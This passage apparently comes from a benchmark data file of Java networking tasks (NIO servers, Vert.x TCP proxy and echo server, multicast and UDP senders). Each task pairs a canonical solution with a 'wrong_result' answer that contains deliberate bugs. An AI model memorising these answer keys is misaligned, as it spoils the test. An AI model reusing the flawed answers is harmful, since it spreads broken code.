SelectionKey.OP_CONNECT);\n                key.attach(task.getContext());\n            } catch (IOException e) {\n                logger.error(\"Failed to connect to peer: \" + task.getHost() + \":\" + task.getPort(), e);\n            }\n        }\n    }\n\n    private void processSelectedKeys() {\n        Set<SelectionKey> selectedKeys = selector.selectedKeys();\n        Iterator<SelectionKey> it = selectedKeys.iterator();\n        while (it.hasNext()) {\n            SelectionKey key = it.next();\n            it.remove();\n            processSelectedKey(key);\n        }\n    }\n\n    private void processSelectedKey(SelectionKey key) {\n        for (KeyProcessor processor : myKeyProcessors) {\n            if (processor.accepts(key)) {\n                try {\n                    processor.process(key);\n                } catch (IOException e) {\n                    logger.error(\"Error processing key\", e);\n                    key.cancel();\n                    try {\n                        key.channel().close();\n                    } catch (IOException ex) {\n                        logger.warn(\"Failed to close channel\", ex);\n                    }\n                }\n                break;\n            }\n        }\n    }\n\n    public boolean offerConnect(ConnectTask task, int timeout, TimeUnit unit) {\n        return addTaskToQueue(task, timeout, unit, myConnectQueue);\n    }\n\n    private <T> boolean addTaskToQueue(T task, int timeout, TimeUnit unit, BlockingQueue<T> queue) {\n        try {\n            return queue.offer(task, timeout, unit);\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n            return false;\n        }\n    }\n\n    private void processWriteTasks() {\n        WriteTask task;\n        while ((task = myWriteQueue.poll()) != null) {\n            SelectionKey key = task.getSelectionKey();\n            if (key != null && key.isValid()) {\n                // Process write operation\n            }\n        }\n    }\n\n    private void cleanup() {\n        myCleanupProcessor.cleanup(selector);\n        lastCleanupTime = myTimeService.currentTimeMillis();\n    }\n\n    private boolean needRunCleanup() {\n        return myTimeService.currentTimeMillis() - lastCleanupTime >= myCleanupTimeoutMillis;\n    }\n}\n```"
  },
  {
    "Task_id": 438,
    "Instruction": "Task Description: Implement a Java NIO-based TCP server that can handle multiple client connections simultaneously on specified ports, and respond with the current date and time when a client connects.\n\nClass Description: The DateServer class is a non-blocking TCP server implementation using Java NIO that listens on multiple ports and sends the current date to connecting clients.\n\nAttributes:\n- selector: Selector - Manages multiple channels and handles I/O operations\n- serverChannels: ServerSocketChannel[] - Array of server channels listening on different ports\n- ports: int[] - Array of port numbers the server should listen on\n\nMethods:\n- DateServer(int[] ports) -> void - Constructor that initializes the server with specified ports\n- initializeServer() -> void - Sets up server channels, configures them as non-blocking, and binds to ports\n- start() -> void - Main server loop that processes incoming connections using the selector\n- handleAccept(SelectionKey key) -> void - Handles new client connections and sends current date\n- close() -> void - Properly closes all server channels and selector to release resources",
    "Canonical_solution": "import java.net.InetSocketAddress;\nimport java.net.ServerSocket;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.nio.channels.ServerSocketChannel;\nimport java.nio.channels.SocketChannel;\nimport java.util.Date;\nimport java.util.Iterator;\nimport java.util.Set;\n\npublic class DateServer {\n\n    private Selector selector;\n    private ServerSocketChannel[] serverChannels;\n    private int[] ports;\n\n    public DateServer(int[] ports) throws Exception {\n        this.ports = ports;\n        this.selector = Selector.open();\n        this.serverChannels = new ServerSocketChannel[ports.length];\n        initializeServer();\n    }\n\n    private void initializeServer() throws Exception {\n        for (int i = 0; i < ports.length; i++) {\n            serverChannels[i] = ServerSocketChannel.open();\n            serverChannels[i].configureBlocking(false);\n            ServerSocket serverSocket = serverChannels[i].socket();\n            InetSocketAddress address = new InetSocketAddress(ports[i]);\n            serverSocket.bind(address);\n            serverChannels[i].register(selector, SelectionKey.OP_ACCEPT);\n            System.out.println(\"\u670d\u52a1\u5668\u8fd0\u884c\uff0c\u5728\" + ports[i] + \"\u7aef\u53e3\u76d1\u542c\u3002\");\n        }\n    }\n\n    public void start() throws Exception {\n        int keysAdd = 0;\n        while ((keysAdd = selector.select()) > 0) {\n            Set<SelectionKey> selectedKeys = selector.selectedKeys();\n            Iterator<SelectionKey> iter = selectedKeys.iterator();\n            while (iter.hasNext()) {\n                SelectionKey key = iter.next();\n                if (key.isAcceptable()) {\n                    handleAccept(key);\n                }\n                iter.remove();\n            }\n        }\n    }\n\n    private void handleAccept(SelectionKey key) throws Exception {\n        ServerSocketChannel server = (ServerSocketChannel) key.channel();\n        SocketChannel client = server.accept();\n        client.configureBlocking(false);\n        ByteBuffer outBuf = ByteBuffer.allocateDirect(1024);\n        outBuf.put((\"\u5f53\u524d\u7684\u65f6\u95f4\u4e3a\uff1a\" + new Date()).getBytes());\n        outBuf.flip();\n        client.write(outBuf);\n        client.close();\n    }\n\n    public void close() throws Exception {\n        for (ServerSocketChannel channel : serverChannels) {\n            if (channel != null) {\n                channel.close();\n            }\n        }\n        if (selector != null) {\n            selector.close();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 7,
    "wrong_result": "```java\nimport java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.*;\nimport java.text.SimpleDateFormat;\nimport java.util.Date;\nimport java.util.Iterator;\nimport java.util.Set;\n\npublic class DateServer {\n    private Selector selector;\n    private ServerSocketChannel[] serverChannels;\n    private int[] ports;\n\n    public DateServer(int[] ports) throws IOException {\n        this.ports = ports;\n        selector = Selector.open();\n        serverChannels = new ServerSocketChannel[ports.length];\n        initializeServer();\n    }\n\n    private void initializeServer() throws IOException {\n        for (int i = 0; i < ports.length; i++) {\n            serverChannels[i] = ServerSocketChannel.open();\n            serverChannels[i].configureBlocking(false);\n            serverChannels[i].socket().bind(new InetSocketAddress(ports[i]));\n            serverChannels[i].register(selector, SelectionKey.OP_ACCEPT);\n        }\n    }\n\n    public void start() {\n        try {\n            while (!Thread.interrupted()) {\n                selector.select();\n                Set<SelectionKey> selectedKeys = selector.selectedKeys();\n                Iterator<SelectionKey> it = selectedKeys.iterator();\n\n                while (it.hasNext()) {\n                    SelectionKey key = it.next();\n                    it.remove();\n\n                    if (!key.isValid()) continue;\n\n                    if (key.isAcceptable()) {\n                        handleAccept(key);\n                    } else if (key.isWritable()) {\n                        SocketChannel clientChannel = (SocketChannel) key.channel();\n                        ByteBuffer buffer = (ByteBuffer) key.attachment();\n                        if (buffer.hasRemaining()) {\n                            clientChannel.write(buffer);\n                        } else {\n                            clientChannel.close();\n                        }\n                    }\n                }\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private void handleAccept(SelectionKey key) throws IOException {\n        ServerSocketChannel serverChannel = (ServerSocketChannel) key.channel();\n        SocketChannel clientChannel = serverChannel.accept();\n        if (clientChannel != null) {\n            clientChannel.configureBlocking(false);\n            clientChannel.register(selector, SelectionKey.OP_WRITE);\n\n            SimpleDateFormat sdf = new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss\");\n            String currentTime = sdf.format(new Date());\n            ByteBuffer buffer = ByteBuffer.wrap(currentTime.getBytes());\n            key.attach(buffer);\n        }\n    }\n\n    public void close() {\n        try {\n            for (ServerSocketChannel channel : serverChannels) {\n                if (channel != null && channel.isOpen()) {\n                    channel.close();\n                }\n            }\n            if (selector != null && selector.isOpen()) {\n                selector.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static void main(String[] args) {\n        try {\n            int[] ports = {8080, 8081};\n            DateServer server = new DateServer(ports);\n            server.start();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 447,
    "Instruction": "Task Description: Create a Java class that implements a multicast sender using UDP with Java NIO's DatagramChannel for non-blocking communication. The class should support both IPv4 and IPv6 protocols and allow sending messages to a multicast group.\n\nClass Description: The MulticastSender class is responsible for sending messages to a multicast group using UDP. It utilizes Java NIO's DatagramChannel for efficient non-blocking communication and supports configuration of TTL (Time To Live) for multicast packets. The class handles both IPv4 and IPv6 protocols automatically based on the system's IP stack type.\n\nAttributes:\n- sock: [DatagramSocket] - The underlying DatagramSocket used for communication\n- mcast_addr: [InetAddress] - The multicast address to send messages to\n- bind_addr: [InetAddress] - The local address to bind to\n- mcast_port: [int] - The multicast port number\n- local_port: [int] - The local port number to bind to\n- ttl: [int] - Time To Live for multicast packets\n- prot_family: [ProtocolFamily] - The protocol family (INET or INET6) determined by the system's IP stack\n\nMethods:\n- MulticastSender: [Constructor](InetAddress bind_addr, int local_port, InetAddress mcast_addr, int mcast_port, int ttl) -> [void] - Initializes the multicast sender with binding address, ports, multicast address, and TTL\n- start: [start]() -> [void] - Starts the sender, binds to the specified address and port, and begins reading input from stdin to send as multicast messages\n- bindToInterfaces: [bindToInterfaces](List<NetworkInterface> interfaces, MulticastSocket s) -> [void] - Helper method to bind multicast socket to multiple network interfaces (currently unused in main flow)",
    "Canonical_solution": "import org.jgroups.util.StackType;\nimport org.jgroups.util.Util;\n\nimport java.io.DataInputStream;\nimport java.io.IOException;\nimport java.net.*;\nimport java.nio.channels.DatagramChannel;\nimport java.util.Collections;\nimport java.util.List;\n\npublic class MulticastSender {\n    protected DatagramSocket sock;\n    protected InetAddress mcast_addr;\n    protected InetAddress bind_addr;\n    protected int mcast_port;\n    protected final int local_port;\n    protected final int ttl;\n    protected static final ProtocolFamily prot_family;\n\n    static {\n        StackType ip_version = Util.getIpStackType();\n        prot_family = ip_version == StackType.IPv6 ? StandardProtocolFamily.INET6 : StandardProtocolFamily.INET;\n    }\n\n    public MulticastSender(InetAddress bind_addr, int local_port, InetAddress mcast_addr, int mcast_port, int ttl) {\n        this.bind_addr = bind_addr;\n        this.local_port = local_port;\n        this.mcast_addr = mcast_addr;\n        this.mcast_port = mcast_port;\n        this.ttl = ttl;\n    }\n\n    public void start() throws Exception {\n        DatagramChannel channel = null;\n        try {\n            channel = DatagramChannel.open(prot_family)\n                    .setOption(StandardSocketOptions.IP_MULTICAST_TTL, ttl)\n                    .bind(new InetSocketAddress(bind_addr, local_port));\n            sock = channel.socket();\n\n            DataInputStream in = new DataInputStream(System.in);\n            while(true) {\n                System.out.print(\"> \");\n                try {\n                    String line = Util.readLine(in);\n                    byte[] buf = line.getBytes();\n                    DatagramPacket packet = new DatagramPacket(buf, buf.length, mcast_addr, mcast_port);\n                    sock.send(packet);\n                }\n                catch(Throwable t) {\n                    t.printStackTrace();\n                }\n            }\n        }\n        finally {\n            if(channel != null)\n                channel.close();\n        }\n    }\n\n    protected void bindToInterfaces(List<NetworkInterface> interfaces, MulticastSocket s) {\n        SocketAddress tmp_mcast_addr = new InetSocketAddress(mcast_addr, mcast_port);\n        for(NetworkInterface intf: interfaces) {\n            try {\n                s.joinGroup(tmp_mcast_addr, intf);\n            }\n            catch(IOException e) {\n                System.err.printf(\"failed joining interface %s: %s\\n\", intf, e);\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 8,
    "wrong_result": "```java\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.net.*;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.DatagramChannel;\nimport java.util.List;\n\npublic class MulticastSender {\n    private DatagramSocket sock;\n    private InetAddress mcast_addr;\n    private InetAddress bind_addr;\n    private int mcast_port;\n    private int local_port;\n    private int ttl;\n    private ProtocolFamily prot_family;\n\n    public MulticastSender(InetAddress bind_addr, int local_port, InetAddress mcast_addr, int mcast_port, int ttl) throws IOException {\n        this.bind_addr = bind_addr;\n        this.mcast_addr = mcast_addr;\n        this.mcast_port = mcast_port;\n        this.local_port = local_port;\n        this.ttl = ttl;\n        this.prot_family = bind_addr instanceof Inet6Address ? StandardProtocolFamily.INET6 : StandardProtocolFamily.INET;\n    }\n\n    public void start() throws IOException {\n        try (DatagramChannel channel = DatagramChannel.open(prot_family)) {\n            channel.configureBlocking(false);\n            sock = channel.socket();\n            sock.setReuseAddress(true);\n            sock.bind(new InetSocketAddress(bind_addr, local_port));\n\n            if (mcast_addr instanceof Inet4Address) {\n                ((MulticastSocket) sock).setTimeToLive(ttl);\n            } else {\n                ((MulticastSocket) sock).setTimeToLive(ttl);\n            }\n\n            BufferedReader stdin = new BufferedReader(new InputStreamReader(System.in));\n            String line;\n            while ((line = stdin.readLine()) != null) {\n                ByteBuffer buffer = ByteBuffer.wrap(line.getBytes());\n                channel.send(buffer, new InetSocketAddress(mcast_addr, mcast_port));\n            }\n        }\n    }\n\n    public void bindToInterfaces(List<NetworkInterface> interfaces, MulticastSocket s) throws IOException {\n        for (NetworkInterface ni : interfaces) {\n            s.setNetworkInterface(ni);\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 449,
    "Instruction": "Task Description: Implement a TCP proxy server using Vert.x that forwards incoming connections to a remote server after writing a custom header.\n\nClass Description: The HAProxy class acts as a TCP proxy server that listens for incoming connections, establishes connections to a remote server, writes a specified header to the remote connection, and then pipes data bidirectionally between the client and server.\n\nAttributes:\n- log: Logger - Logger instance for logging debug and error messages\n- HOST: String - The host address where the proxy server will listen (default: \"localhost\")\n- PORT: int - The port number where the proxy server will listen (default: 11080)\n- remoteAddress: SocketAddress - The address of the remote server to forward connections to\n- header: Buffer - The header data to write to the remote connection\n- server: NetServer - The Vert.x TCP server instance\n- client: NetClient - The Vert.x TCP client instance for connecting to remote server\n- connectionRemoteAddress: SocketAddress - Stores the remote address of the established connection\n- connectionLocalAddress: SocketAddress - Stores the local address of the established connection\n\nMethods:\n- HAProxy(SocketAddress remoteAddress, Buffer header) -> HAProxy - Constructor that initializes the proxy with remote server address and header data\n- start(Vertx vertx) -> HAProxy - Starts the proxy server, configures connection handling, and returns the instance (throws Exception if startup fails)\n- stop() -> void - Stops the proxy server and cleans up resources\n- getConnectionRemoteAddress() -> SocketAddress - Returns the remote address of the established connection\n- getConnectionLocalAddress() -> SocketAddress - Returns the local address of the established connection",
    "Canonical_solution": "import io.vertx.core.Vertx;\nimport io.vertx.core.buffer.Buffer;\nimport io.vertx.core.internal.logging.Logger;\nimport io.vertx.core.internal.logging.LoggerFactory;\nimport io.vertx.core.net.NetServer;\nimport io.vertx.core.net.NetServerOptions;\nimport io.vertx.core.net.NetClient;\nimport io.vertx.core.net.NetSocket;\nimport io.vertx.core.net.SocketAddress;\n\nimport java.util.concurrent.CompletableFuture;\nimport java.util.concurrent.TimeUnit;\n\npublic class HAProxy {\n\n    private static final Logger log = LoggerFactory.getLogger(HAProxy.class);\n    private static final String HOST = \"localhost\";\n    private static final int PORT = 11080;\n    private final SocketAddress remoteAddress;\n    private final Buffer header;\n    private NetServer server;\n    private NetClient client;\n    private SocketAddress connectionRemoteAddress;\n    private SocketAddress connectionLocalAddress;\n\n    public HAProxy(SocketAddress remoteAddress, Buffer header) {\n        this.remoteAddress = remoteAddress;\n        this.header = header;\n    }\n\n    public HAProxy start(Vertx vertx) throws Exception {\n        NetServerOptions options = new NetServerOptions();\n        options.setHost(HOST).setPort(PORT);\n        server = vertx.createNetServer(options);\n        client = vertx.createNetClient();\n\n        server.connectHandler(socket -> {\n            socket.pause();\n            client.connect(remoteAddress).onComplete(result -> {\n                if (result.succeeded()) {\n                    log.debug(\"connected, writing header\");\n                    NetSocket clientSocket = result.result();\n                    connectionRemoteAddress = clientSocket.remoteAddress();\n                    connectionLocalAddress = clientSocket.localAddress();\n                    clientSocket.write(header).onSuccess(u -> {\n                        log.debug(\"starting pump\");\n                        socket.closeHandler(v -> clientSocket.close());\n                        clientSocket.closeHandler(v -> socket.close());\n                        socket.pipeTo(clientSocket);\n                        clientSocket.pipeTo(socket);\n                        socket.resume();\n                    }).onFailure(u -> {\n                        log.error(\"exception writing header\", result.cause());\n                        socket.close();\n                    });\n                } else {\n                    log.error(\"exception\", result.cause());\n                    socket.close();\n                }\n            });\n        });\n\n        CompletableFuture<Void> fut = new CompletableFuture<>();\n        server.listen().onComplete(ar -> {\n            if (ar.succeeded()) {\n                fut.complete(null);\n            } else {\n                fut.completeExceptionally(ar.cause());\n            }\n        });\n        fut.get(10, TimeUnit.SECONDS);\n        log.debug(\"HAProxy server started\");\n        return this;\n    }\n\n    public void stop() {\n        if (server != null) {\n            server.close();\n            server = null;\n        }\n    }\n\n    public SocketAddress getConnectionRemoteAddress() {\n        return connectionRemoteAddress;\n    }\n\n    public SocketAddress getConnectionLocalAddress() {\n        return connectionLocalAddress;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 13,
    "wrong_result": "```java\nimport io.vertx.core.AbstractVerticle;\nimport io.vertx.core.buffer.Buffer;\nimport io.vertx.core.net.NetClient;\nimport io.vertx.core.net.NetServer;\nimport io.vertx.core.net.NetSocket;\nimport io.vertx.core.logging.Logger;\nimport io.vertx.core.logging.LoggerFactory;\nimport io.vertx.core.net.SocketAddress;\n\npublic class HAProxy extends AbstractVerticle {\n  private final Logger log = LoggerFactory.getLogger(HAProxy.class);\n  private String HOST = \"localhost\";\n  private int PORT = 11080;\n  private final SocketAddress remoteAddress;\n  private final Buffer header;\n  private NetServer server;\n  private NetClient client;\n  private SocketAddress connectionRemoteAddress;\n  private SocketAddress connectionLocalAddress;\n\n  public HAProxy(SocketAddress remoteAddress, Buffer header) {\n    this.remoteAddress = remoteAddress;\n    this.header = header;\n  }\n\n  public HAProxy start(Vertx vertx) throws Exception {\n    this.server = vertx.createNetServer();\n    this.client = vertx.createNetClient();\n\n    server.connectHandler(clientSocket -> {\n      connectionLocalAddress = clientSocket.localAddress();\n      client.connect(remoteAddress, res -> {\n        if (res.succeeded()) {\n          NetSocket serverSocket = res.result();\n          connectionRemoteAddress = serverSocket.remoteAddress();\n          serverSocket.write(header);\n\n          clientSocket.handler(buffer -> serverSocket.write(buffer));\n          serverSocket.handler(buffer -> clientSocket.write(buffer));\n\n          clientSocket.endHandler(v -> serverSocket.end());\n          serverSocket.endHandler(v -> clientSocket.end());\n        } else {\n          log.error(\"Failed to connect to remote server\", res.cause());\n          clientSocket.close();\n        }\n      });\n    });\n\n    server.listen(PORT, HOST, listenResult -> {\n      if (listenResult.succeeded()) {\n        log.info(\"HAProxy is listening on port \" + PORT);\n      } else {\n        throw new Exception(\"Failed to start HAProxy server\", listenResult.cause());\n      }\n    });\n\n    return this;\n  }\n\n  public void stop() {\n    if (server != null) {\n      server.close(ar -> {\n        if (ar.succeeded()) {\n          log.info(\"HAProxy server stopped\");\n        } else {\n          log.error(\"Failed to stop HAProxy server\", ar.cause());\n        }\n      });\n    }\n    if (client != null) {\n      client.close();\n    }\n  }\n\n  public SocketAddress getConnectionRemoteAddress() {\n    return connectionRemoteAddress;\n  }\n\n  public SocketAddress getConnectionLocalAddress() {\n    return connectionLocalAddress;\n  }\n}\n```"
  },
  {
    "Task_id": 450,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Vert.x framework to handle multiple client connections, process incoming data, and manage server lifecycle operations.\n\nClass Description: The VertxTcpServer class provides functionality to start, stop, and manage a TCP server using Vert.x. It handles client connections, processes incoming data with echo functionality, and manages connection events.\n\nAttributes:\n- server: [NetServer] - The Vert.x NetServer instance that manages TCP connections\n\nMethods:\n- startServer(Vertx vertx, int port, String host) -> void - Initializes and starts the TCP server on specified host and port\n- handleConnection(NetSocket socket) -> void - Handles incoming client connections, processes data, and manages connection events\n- stopServer() -> void - Gracefully shuts down the TCP server\n\nMethod Details:\n1. startServer(Vertx vertx, int port, String host) -> void\n   - Input Parameters:\n     - vertx: Vertx - The Vert.x instance\n     - port: int - The port number to listen on\n     - host: String - The host address to bind to\n   - Description: Configures server options, creates NetServer instance, sets up connection handler, and starts listening for connections\n\n2. handleConnection(NetSocket socket) -> void\n   - Input Parameters:\n     - socket: NetSocket - The client connection socket\n   - Description: Sets up handlers for incoming data (echoes back received data), connection closure, and exceptions\n\n3. stopServer() -> void\n   - Description: Closes the server and all active connections, with completion handler for success/failure notification",
    "Canonical_solution": "import io.vertx.core.Vertx;\nimport io.vertx.core.net.NetServer;\nimport io.vertx.core.net.NetServerOptions;\nimport io.vertx.core.net.NetSocket;\nimport io.vertx.core.buffer.Buffer;\n\npublic class VertxTcpServer {\n\n    private NetServer server;\n\n    public void startServer(Vertx vertx, int port, String host) {\n        NetServerOptions options = new NetServerOptions().setPort(port).setHost(host);\n        server = vertx.createNetServer(options);\n\n        server.connectHandler(socket -> {\n            handleConnection(socket);\n        });\n\n        server.listen().onComplete(res -> {\n            if (res.succeeded()) {\n                System.out.println(\"Server is now listening on port: \" + port);\n            } else {\n                System.out.println(\"Failed to bind: \" + res.cause().getMessage());\n            }\n        });\n    }\n\n    private void handleConnection(NetSocket socket) {\n        socket.handler(buffer -> {\n            System.out.println(\"Received data: \" + buffer.length() + \" bytes\");\n            socket.write(Buffer.buffer(\"Echo: \").appendBuffer(buffer));\n        });\n\n        socket.closeHandler(v -> {\n            System.out.println(\"Connection closed\");\n        });\n\n        socket.exceptionHandler(err -> {\n            System.err.println(\"Connection error: \" + err.getMessage());\n        });\n    }\n\n    public void stopServer() {\n        if (server != null) {\n            server.close().onComplete(res -> {\n                if (res.succeeded()) {\n                    System.out.println(\"Server closed successfully\");\n                } else {\n                    System.err.println(\"Failed to close server: \" + res.cause().getMessage());\n                }\n            });\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 13,
    "wrong_result": "```java\nimport io.vertx.core.AbstractVerticle;\nimport io.vertx.core.Vertx;\nimport io.vertx.core.net.NetServer;\nimport io.vertx.core.net.NetSocket;\n\npublic class VertxTcpServer extends AbstractVerticle {\n\n  private NetServer server;\n\n  public void startServer(Vertx vertx, int port, String host) {\n    server = vertx.createNetServer();\n    server.connectHandler(this::handleConnection);\n    server.listen(port, host, result -> {\n      if (result.succeeded()) {\n        System.out.println(\"Server is now listening on port \" + port);\n      } else {\n        System.err.println(\"Failed to bind server: \" + result.cause());\n      }\n    });\n  }\n\n  public void handleConnection(NetSocket socket) {\n    System.out.println(\"Client connected: \" + socket.remoteAddress());\n\n    socket.handler(buffer -> {\n      System.out.println(\"Received data from client: \" + buffer.toString());\n      socket.write(buffer); // Echo back the received data\n    });\n\n    socket.endHandler(v -> {\n      System.out.println(\"Client disconnected: \" + socket.remoteAddress());\n    });\n\n    socket.exceptionHandler(err -> {\n      System.err.println(\"Error occurred with client: \" + err.getMessage());\n      socket.close();\n    });\n  }\n\n  public void stopServer() {\n    if (server != null) {\n      server.close(result -> {\n        if (result.succeeded()) {\n          System.out.println(\"Server stopped successfully.\");\n        } else {\n          System.err.println(\"Failed to stop server: \" + result.cause().getMessage());\n        }\n      });\n    }\n  }\n}\n```"
  },
  {
    "Task_id": 451,
    "Instruction": "Task Description: Create a Java class that implements a clustered event bus using Vert.x TCP server for inter-process communication, handling message delivery between distributed components.\n\nClass Description: The ClusteredEventBus class extends EventBusImpl to provide clustered event bus functionality using Vert.x's TCP server capabilities. It manages TCP connections, processes incoming messages, and delivers them locally within the cluster.\n\nAttributes:\n- options: [EventBusOptions] - Configuration options for the event bus including port, host, and other TCP settings\n- server: [NetServer] - The Vert.x TCP server instance that handles incoming connections\n\nMethods:\n- ClusteredEventBus([VertxInternal vertx, VertxOptions options]) -> [void] - Constructor that initializes the clustered event bus with Vertx instance and options\n- getServerOptions() -> [NetServerOptions] - Creates and returns NetServerOptions based on the event bus configuration\n- start([Promise<Void> promise]) -> [void] - Starts the TCP server and sets up connection handlers\n- getServerHandler() -> [Handler<NetSocket>] - Creates and returns the handler for processing incoming TCP connections and messages\n- getClusterPort() -> [int] - Returns the configured cluster port from options\n- getClusterHost() -> [String] - Returns the configured cluster host address from options or default address if not specified",
    "Canonical_solution": "import io.vertx.core.*;\nimport io.vertx.core.buffer.Buffer;\nimport io.vertx.core.net.NetServer;\nimport io.vertx.core.net.NetServerOptions;\nimport io.vertx.core.net.NetSocket;\nimport io.vertx.core.parsetools.RecordParser;\n\npublic class ClusteredEventBus extends EventBusImpl {\n\n  private final EventBusOptions options;\n  private NetServer server;\n\n  public ClusteredEventBus(VertxInternal vertx, VertxOptions options) {\n    super(vertx);\n    this.options = options.getEventBusOptions();\n  }\n\n  private NetServerOptions getServerOptions() {\n    return new NetServerOptions(this.options.toJson());\n  }\n\n  @Override\n  public void start(Promise<Void> promise) {\n    NetServerOptions serverOptions = getServerOptions();\n    server = vertx.createNetServer(serverOptions);\n    server.connectHandler(getServerHandler());\n    int port = getClusterPort();\n    String host = getClusterHost();\n    server.listen(port, host).onComplete(promise);\n  }\n\n  private Handler<NetSocket> getServerHandler() {\n    return socket -> {\n      RecordParser parser = RecordParser.newFixed(4);\n      Handler<Buffer> handler = new Handler<Buffer>() {\n        int size = -1;\n\n        public void handle(Buffer buff) {\n          if (size == -1) {\n            size = buff.getInt(0);\n            parser.fixedSizeMode(size);\n          } else {\n            ClusteredMessage received = new ClusteredMessage(ClusteredEventBus.this);\n            received.readFromWire(buff, codecManager);\n            parser.fixedSizeMode(4);\n            size = -1;\n            if (received.codec() == CodecManager.PING_MESSAGE_CODEC) {\n              socket.write(PONG);\n            } else {\n              deliverMessageLocally(received);\n            }\n          }\n        }\n      };\n      parser.setOutput(handler);\n      socket.handler(parser);\n    };\n  }\n\n  private int getClusterPort() {\n    return options.getPort();\n  }\n\n  private String getClusterHost() {\n    String host;\n    if ((host = options.getHost()) != null) {\n      return host;\n    }\n    return AddressHelper.defaultAddress();\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 13,
    "wrong_result": "```java\npublic class ClusteredEventBus extends EventBusImpl {\n\n    private final EventBusOptions options;\n    private NetServer server;\n\n    public ClusteredEventBus(VertxInternal vertx, VertxOptions options) {\n        super(vertx);\n        this.options = options.getEventBusOptions();\n    }\n\n    private NetServerOptions getServerOptions() {\n        NetServerOptions netOptions = new NetServerOptions()\n            .setPort(options.getPort())\n            .setHost(options.getHost());\n        return netOptions;\n    }\n\n    public void start(Promise<Void> promise) {\n        server = vertx.createNetServer(getServerOptions());\n        server.connectHandler(getServerHandler());\n        server.listen(ar -> {\n            if (ar.succeeded()) {\n                promise.complete();\n            } else {\n                promise.fail(ar.cause());\n            }\n        });\n    }\n\n    private Handler<NetSocket> getServerHandler() {\n        return socket -> {\n            Buffer buffer = Buffer.buffer();\n            socket.handler(buffer::appendBuffer);\n            socket.endHandler(v -> {\n                if (!buffer.isEmpty()) {\n                    processMessage(buffer);\n                }\n            });\n        };\n    }\n\n    private void processMessage(Buffer buffer) {\n        // Implement message decoding and local delivery logic here\n    }\n\n    public int getClusterPort() {\n        return options.getPort();\n    }\n\n    public String getClusterHost() {\n        return options.getHost() != null ? options.getHost() : \"localhost\";\n    }\n}\n```"
  },
  {
    "Task_id": 453,
    "Instruction": "Task Description: Implement a function that demonstrates UDP communication using Vert.x in Java, allowing sending of data packets to a specified target address and port, with success/failure notification.\n\nFunction Description: The function creates a UDP socket using Vert.x, configures it with default options, and demonstrates two ways to send data: using a Buffer object and directly using a String. It includes asynchronous result handling to report whether each send operation succeeded.\n\nInput:\n- vertx: Vertx - The Vert.x instance used to create the UDP socket\n\nOutput: None (The function's output is the side effect of sending UDP packets and printing success/failure messages to the console)",
    "Canonical_solution": "import io.vertx.core.Vertx;\nimport io.vertx.core.buffer.Buffer;\nimport io.vertx.core.datagram.DatagramSocket;\nimport io.vertx.core.datagram.DatagramSocketOptions;\n\npublic void example2(Vertx vertx) {\n    DatagramSocket socket = vertx.createDatagramSocket(new DatagramSocketOptions());\n    Buffer buffer = Buffer.buffer(\"content\");\n    socket\n      .send(buffer, 1234, \"10.0.0.1\")\n      .onComplete(asyncResult -> System.out.println(\"Send succeeded? \" + asyncResult.succeeded()));\n    socket\n      .send(\"A string used as content\", 1234, \"10.0.0.1\")\n      .onComplete(asyncResult -> System.out.println(\"Send succeeded? \" + asyncResult.succeeded()));\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 14,
    "wrong_result": "```java\nvoid demonstrateUdpCommunication(Vertx vertx) {\n  DatagramSocket socket = vertx.createDatagramSocket(new DatagramSocketOptions());\n  String targetAddress = \"127.0.0.1\";\n  int targetPort = 8888;\n  String message = \"Hello from Vert.x UDP!\";\n\n  socket.send(message, targetPort, targetAddress, ar -> {\n    if (ar.succeeded()) {\n      System.out.println(\"Message sent successfully using String.\");\n    } else {\n      System.out.println(\"Failed to send message using String: \" + ar.cause().getMessage());\n    }\n  });\n\n  Buffer buffer = Buffer.buffer(message);\n  socket.send(buffer, targetPort, targetAddress, ar -> {\n    if (ar.succeeded()) {\n      System.out.println(\"Message sent successfully using Buffer.\");\n    } else {\n      System.out.println(\"Failed to send message using Buffer: \" + ar.cause().getMessage());\n    }\n  });\n}\n```"
  },
  {
    "Task_id": 47,
    "Instruction": "Task Description: Create a Java class that implements metadata updates for an Icecast broadcast server using HTTP client functionality.\n\nClass Description: The IcecastBroadcastMetadataUpdater class is responsible for sending metadata updates to an Icecast server via HTTP requests. It constructs the appropriate URL, handles authentication, and manages the HTTP communication asynchronously. The class implements the IBroadcastMetadataUpdater interface and handles character encoding, error logging, and connection status tracking.\n\nAttributes:\n- mLog: Logger - Logger instance for error and status logging\n- mHttpClient: HttpClient - HTTP client instance for making requests\n- mIcecastConfiguration: IcecastConfiguration - Configuration object containing server details (host, port, mount point, credentials)\n- mConnectionLoggingSuppressed: boolean - Flag to prevent duplicate connection error logs\n\nMethods:\n- IcecastBroadcastMetadataUpdater(IcecastConfiguration icecastConfiguration) -> void - Constructor that initializes the class with Icecast server configuration\n- update(IdentifierCollection identifierCollection) -> void - Main method that constructs and sends the metadata update request to the Icecast server. Takes an IdentifierCollection containing metadata information as input. Handles URL construction, encoding, and asynchronous request execution.",
